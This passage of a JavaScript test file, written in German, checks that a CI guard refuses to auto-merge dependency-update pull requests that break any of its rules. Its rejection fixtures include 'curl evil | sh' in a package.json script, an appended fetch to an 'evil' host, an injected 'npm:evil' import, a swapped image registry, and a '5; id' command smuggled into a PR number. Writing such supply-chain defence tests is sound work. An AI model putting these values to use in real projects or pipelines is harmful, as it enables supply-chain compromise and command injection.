    expect(await regelLauf(m, { git: { hinter: "2" } })).toMatchObject({ ergebnis: "hinter-main" });
  });

  test("Regeln: jede Verletzung verhindert den Merge", L, async () => {
    const m = await lade();
    const alt = DATEIEN();
    const mitLock = (d, v) => ({ ...d, "package-lock.json": lock(v) });
    const faelle = {
      "PR von einer Person": [1, { pr: { user: { login: "ooeler" } } }],
      "PR aus Fork": [1, { pr: { head: { repo: { full_name: "x/y" }, ref: "fix/abhaengigkeiten-2026-11-16", sha: KOPF } } }],
      "Entwurf": [1, { pr: { draft: true } }],
      "Ziel nicht main": [1, { pr: { base: { ref: "dev" } } }],
      "anderer Branch": [1, { pr: { head: { repo: { full_name: R }, ref: "fix/etwas", sha: KOPF } } }],
      "Lauf auf anderem Branch": [1, { env: { REF: "fix/abhaengigkeiten-2026-11-15" } }],
      "neuerer Commit": [1, { pr: { head: { repo: { full_name: R }, ref: "fix/abhaengigkeiten-2026-11-16", sha: "e".repeat(40) } } }],
      "fremder Commit": [1, { git: { autoren: `${BOT_MAIL} ${BOT_MAIL}\nevil@x ${BOT_MAIL}` } }],
      "PR-Nummer kaputt": [1, { env: { PR: "5; id" } }],
      "andere Datei": [2, { git: { diff: "package.json\nscripts/build.mjs" } }],
      "Workflow geändert": [2, { git: { diff: ".github/workflows/ci.yml" } }],
      "mehr als Versionen geändert": [2, { aendern: (d) => ({ ...d, "supabase/functions/invite/index.ts": d["supabase/functions/invite/index.ts"] + "fetch('https://evil');\n" }) }],
      "Skript in package.json": [2, { aendern: (d) => ({ ...d, "package.json": d["package.json"].replace('"node scripts/vendor.js"', '"curl evil | sh"') }) }],
      "neues Paket": [2, { aendern: (d) => ({ ...d, "supabase/functions/invite/index.ts": d["supabase/functions/invite/index.ts"] + 'import "npm:evil@1.0.0";\n' }) }],
      "Lockfile passt nicht": [2, { aendern: (d) => mitLock(d, { sb: "2.118.0", pw: "1.65.0", hs: "14.1.1" }) }],
      "Image fremder Herkunft": [2, { aendern: (d) => ({ ...d, ".github/container-images.json": d[".github/container-images.json"].replace("mcr.microsoft.com/playwright", "evil.io/playwright") }) }],
      "uneinheitliche Versionen": [6, { aendern: (d) => ({ ...d, "supabase/functions/invite/index.ts": FN["supabase/functions/invite/index.ts"] }) }],
      "Major ohne Freigabe": [3, { dateienKopf: { ...alt, ...m.anwenden(alt, { npm: { "web-push": "4.0.0" } }) } }],
      "Rückstufung": [3, { dateienKopf: { ...mitLock(alt, { sb: "2.117.0", pw: "1.64.1", hs: "14.1.1" }), ...m.anwenden(alt, { npm: { "@supabase/supabase-js": "2.117.0" } }) } }],
      "Version zu jung, ohne Lücke": [4, { dateienKopf: { ...mitLock(alt, { sb: "2.120.0", pw: "1.64.1", hs: "14.1.1" }), ...m.anwenden(alt, { npm: { "@supabase/supabase-js": "2.120.0" } }) } }],
      "veraltete Version": [4, { dateienKopf: { ...alt, ...m.anwenden(alt, { npm: { "web-push": "3.6.8" } }) } }],
      "neue Version mit Lücke": [4, { q: { osv: [vuln("GHSA-gggg-hhhh-iiii", "@supabase/supabase-js", [{ introduced: "2.119.0" }])] } }],
      "Image passt nicht zu @playwright/test": [5, { aendern: (d) => ({ ...d, ".github/container-images.json": BILDER("1.64.1", D("a")) }) }],
      "Digest nicht aus der Registry": [5, { q: { bilder: { "playwright@1.65.0": D("9") } } }],
      "Semgrep zu jung": [5, { dateienKopf: { ...alt, ".github/container-images.json": BILDER("1.64.1", D("a"), "1.184.0", D("d")) }, q: { releases: [{ tag_name: "v1.184.0", published_at: vor(3), draft: false, prerelease: false }] } }],
    };
    for (const [name, [regel, o]] of Object.entries(faelle)) {
      const r = await regelLauf(m, o);
      expect(r.ergebnis, name).toBe("abgelehnt");
      expect(r.grund, name).toMatch(new RegExp(`^Regel ${regel}: `));
    }
    // Major nur mit Freigabe einer Person (nicht des Workflows) und nur im Major-Branch
    const major = { ...alt, ...m.anwenden(alt, { npm: { "web-push": "4.0.0" } }) };
    const mb = { pr: { head: { repo: { full_name: R }, ref: "fix/abhaengigkeiten-major-2026-11-16", sha: KOPF } }, env: { REF: "fix/abhaengigkeiten-major-2026-11-16" } };
    expect((await regelLauf(m, { dateienKopf: major, ...mb, env: { ...mb.env, FREIGABE: "true", AUSLOESER: "ooeler" } })).ergebnis).toBe("ok");
    expect((await regelLauf(m, { dateienKopf: major, ...mb, env: { ...mb.env, FREIGABE: "true", AUSLOESER: "github-actions[bot]" } })).ergebnis).toBe("abgelehnt");
    expect((await regelLauf(m, { dateienKopf: major, env: { FREIGABE: "true", AUSLOESER: "ooeler" } })).ergebnis).toBe("abgelehnt");
    // Sicherheit: jüngere Version erlaubt, wenn die alte eine bekannte Lücke hat
    const jung = { ...mitLock(alt, { sb: "2.120.0", pw: "1.64.1", hs: "14.1.1" }), ...m.anwenden(alt, { npm: { "@supabase/supabase-js": "2.120.0" } }) };
    expect((await regelLauf(m, { dateienKopf: jung, q: { osv: [vuln("GHSA-ssss-tttt-uuuu", "@supabase/supabase-js", [{ introduced: "2.0.0" }, { fixed: "2.120.0" }])] } })).ergebnis).toBe("ok");
  });
});
